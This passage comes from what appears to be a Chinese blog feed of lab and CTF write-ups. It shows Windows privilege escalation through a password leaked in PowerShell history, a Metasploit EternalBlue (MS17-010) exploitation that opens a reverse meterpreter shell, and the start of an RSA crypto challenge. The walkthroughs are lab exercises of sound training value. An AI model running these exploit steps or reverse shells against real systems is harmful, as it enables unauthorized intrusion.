operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN<span class="token punctuation">\</span>Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN<span class="token punctuation">\</span>Usuarios de administraci¢n remota    Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                         Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Esta compa¤¡a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Cuenta <span class="token builtin class-name">local</span>                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria<span class="token punctuation">\</span>Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeShutdownPrivilege           Apagar el sistema                            Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeUndockPrivilege             Quitar equipo de la estaci¢n de acoplamiento Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
SeTimeZonePrivilege           Cambiar la zona horaria                      Habilitada</code></pre>
<p>组和权限貌似没什么提权手段，传一个winpeas搜一下信息</p>
<h2 id="winpeas"><a href="#winpeas" class="headerlink" title="winpeas"></a>winpeas</h2><p><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240707-68b6f322">https://github.com/peass-ng/PEASS-ng/releases/tag/20240707-68b6f322</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token operator">></span> upload winPEASx64.exe
                                        
Info: Uploading /root/Desktop/winPEASx64.exe to C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>winPEASx64.exe
                                        
Data: <span class="token number">3183272</span> bytes of <span class="token number">3183272</span> bytes copied
                                        
Info: Upload successful<span class="token operator">!</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token operator">></span> .<span class="token punctuation">\</span>winPEASx64.exe</code></pre>
<p>发现有历史powershell记录<br><img src="https://ooo.0x0.ooo/2024/07/18/ORntza.png" alt="ORntza.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">type</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>PowerShell<span class="token punctuation">\</span>PSReadLine<span class="token punctuation">\</span>ConsoleHost_history.txt
Set-LocalUser <span class="token parameter variable">-Name</span> <span class="token string">"administrator"</span> <span class="token parameter variable">-Password</span> <span class="token punctuation">(</span>ConvertTo-SecureString <span class="token string">"SuperAdministrator123"</span> <span class="token parameter variable">-AsPlainText</span> -Force<span class="token punctuation">)</span></code></pre>
<p>拿到administrator密码<code>SuperAdministrator123</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.202 <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> SuperAdministrator123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">dir</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator<span class="token operator">></span> <span class="token function">dir</span>


    Directorio: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                3D Objects
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Contacts
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:49 PM                Desktop
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Documents
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Downloads
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Favorites
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Links
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Music
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:17 PM                Pictures
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Saved Games
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:17 PM                Searches
d-r---          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:15 PM                Videos


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator<span class="token operator">></span> <span class="token builtin class-name">type</span> Desktop/root.txt
fe586ba8f585e1ea97347be057659b81</code></pre>




]]></content>
      <categories>
        <category>Vulnyx</category>
      </categories>
      <tags>
        <tag>ps-history</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnyx-Eternal</title>
    <url>/posts/c9c80648/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.200</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:a5:47:e3       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.200  08:00:27:1b:02:dc       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.941</span> seconds <span class="token punctuation">(</span><span class="token number">131.89</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.200
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 <span class="token number">20</span>:36 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.200
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00031s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65525</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE      VERSION
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds Windows <span class="token number">7</span> Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> microsoft-ds <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
<span class="token number">5357</span>/tcp  <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Service Unavailable
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49152</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49153</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49154</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49155</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49156</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49157</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:1B:02:DC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Microsoft Windows <span class="token number">7</span><span class="token operator">|</span><span class="token number">2008</span><span class="token operator">|</span><span class="token number">8.1</span>
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows <span class="token number">7</span> SP0 - SP1, Windows Server <span class="token number">2008</span> SP1, Windows Server <span class="token number">2008</span> R2, Windows <span class="token number">8</span>, or Windows <span class="token number">8.1</span> Update <span class="token number">1</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host: MIKE-PC<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">2</span>:1:0: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-17T19:10:22
<span class="token operator">|</span>_  start_date: <span class="token number">2024</span>-07-17T18:22:11
<span class="token operator">|</span>_clock-skew: mean: 5h52m39s, deviation: 1h09m16s, median: 6h32m38s
<span class="token operator">|</span> smb-security-mode: 
<span class="token operator">|</span>   account_used: <span class="token operator">&lt;</span>blank<span class="token operator">></span>
<span class="token operator">|</span>   authentication_level: user
<span class="token operator">|</span>   challenge_response: supported
<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
<span class="token operator">|</span>_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:1b:02:dc <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
<span class="token operator">|</span> smb-os-discovery: 
<span class="token operator">|</span>   OS: Windows <span class="token number">7</span> Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> <span class="token punctuation">(</span>Windows <span class="token number">7</span> Enterprise <span class="token number">6.1</span><span class="token punctuation">)</span>
<span class="token operator">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1
<span class="token operator">|</span>   Computer name: MIKE-PC
<span class="token operator">|</span>   NetBIOS computer name: MIKE-PC<span class="token punctuation">\</span>x00
<span class="token operator">|</span>   Workgroup: WORKGROUP<span class="token punctuation">\</span>x00
<span class="token operator">|</span>_  System time: <span class="token number">2024</span>-07-17T21:10:22+02:00

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.31</span> ms <span class="token number">192.168</span>.56.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">106.00</span> seconds</code></pre>
<p>是一个win7的系统，有SMB服务,没有Kerberos</p>
<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token parameter variable">--script</span> vuln <span class="token parameter variable">-p445</span> <span class="token number">192.168</span>.56.200
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 <span class="token number">20</span>:47 CST
Pre-scan script results:
<span class="token operator">|</span> broadcast-avahi-dos: 
<span class="token operator">|</span>   Discovered hosts:
<span class="token operator">|</span>     <span class="token number">224.0</span>.0.251
<span class="token operator">|</span>   After NULL UDP avahi packet DoS <span class="token punctuation">(</span>CVE-2011-1002<span class="token punctuation">)</span>.
<span class="token operator">|</span>_  Hosts are all up <span class="token punctuation">(</span>not vulnerable<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.200
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00030s latency<span class="token punctuation">)</span>.

PORT    STATE SERVICE
<span class="token number">445</span>/tcp <span class="token function">open</span>  microsoft-ds
MAC Address: 08:00:27:1B:02:DC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Host script results:
<span class="token operator">|</span>_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
<span class="token operator">|</span>_smb-vuln-ms10-054: <span class="token boolean">false</span>
<span class="token operator">|</span>_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
<span class="token operator">|</span> smb-vuln-ms17-010: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Remote Code Execution vulnerability <span class="token keyword">in</span> Microsoft SMBv1 servers <span class="token punctuation">(</span>ms17-010<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2017-0143
<span class="token operator">|</span>     Risk factor: HIGH
<span class="token operator">|</span>       A critical remote code execution vulnerability exists <span class="token keyword">in</span> Microsoft SMBv1
<span class="token operator">|</span>        servers <span class="token punctuation">(</span>ms17-010<span class="token punctuation">)</span>.
<span class="token operator">|</span>           
<span class="token operator">|</span>     Disclosure date: <span class="token number">2017</span>-03-14
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2017-0143
<span class="token operator">|</span>       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
<span class="token operator">|</span>_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">39.29</span> seconds</code></pre>
<p>又是ms17-010</p>
<h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h2><pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.56.200
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.56.200
msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.56.104
lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.56.104
msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.56.104:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445    - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows <span class="token number">7</span> Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> x64 <span class="token punctuation">(</span><span class="token number">64</span>-bit<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445    - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - The target is vulnerable.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Connecting to target <span class="token keyword">for</span> exploitation.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Connection established <span class="token keyword">for</span> exploitation.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Target OS selected valid <span class="token keyword">for</span> OS indicated by SMB reply
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - CORE raw buffer dump <span class="token punctuation">(</span><span class="token number">40</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - 0x00000000  <span class="token number">57</span> <span class="token number">69</span> 6e <span class="token number">64</span> 6f <span class="token number">77</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">37</span> <span class="token number">20</span> <span class="token number">45</span> 6e <span class="token number">74</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">70</span>  Windows <span class="token number">7</span> Enterp
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - 0x00000010  <span class="token number">72</span> <span class="token number">69</span> <span class="token number">73</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">37</span> <span class="token number">36</span> <span class="token number">30</span> <span class="token number">31</span> <span class="token number">20</span> <span class="token number">53</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">76</span> <span class="token number">69</span> <span class="token number">63</span>  rise <span class="token number">7601</span> Servic
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - 0x00000020  <span class="token number">65</span> <span class="token number">20</span> <span class="token number">50</span> <span class="token number">61</span> <span class="token number">63</span> 6b <span class="token number">20</span> <span class="token number">31</span>                          e Pack <span class="token number">1</span>        
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Target arch selected valid <span class="token keyword">for</span> arch indicated by DCE/RPC reply
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Trying exploit with <span class="token number">12</span> Groom Allocations.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Sending all but last fragment of exploit packet
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Starting non-paged pool grooming
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Sending SMBv2 buffers
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Closing SMBv1 connection creating <span class="token function">free</span> hole adjacent to SMBv2 buffer.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Sending final SMBv2 buffers.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Sending last fragment of exploit packet<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Receiving response from exploit packet
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Sending egg to corrupted connection.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - Triggering <span class="token function">free</span> of corrupted buffer.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">201798</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.56.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.56.104:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.56.200:49178<span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 <span class="token number">20</span>:49:59 +0800
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-WIN-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.200:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>

meterpreter <span class="token operator">></span> </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>MIKE<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type user.txt
<span class="token builtin class-name">type</span> user.txt
c4fa8bfbc9855acfced6a56a7da3156e 

C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>MIKE<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type root*
<span class="token builtin class-name">type</span> root*

root.txt


1682c7160e3855a6685316efb97ce451 </code></pre>
]]></content>
      <categories>
        <category>Vulnyx</category>
      </categories>
      <tags>
        <tag>ms17-010</tag>
      </tags>
  </entry>
  <entry>
    <title>LitCTF2024未解题复现</title>
    <url>/posts/bd91e42f/</url>
    <content><![CDATA[<p>当时下午才做的，做了几个密码就吃饭去了，现在回头看下题目</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Polynomial"><a href="#Polynomial" class="headerlink" title="Polynomial"></a>Polynomial</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> <span class="token operator">*</span>

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r

Polynomial1 <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> q
Polynomial2 <span class="token operator">=</span> q<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> r
Polynomial3 <span class="token operator">=</span> r<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> p

c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Polynomial1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>Polynomial1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Polynomial2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>Polynomial2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Polynomial3 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>Polynomial3<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
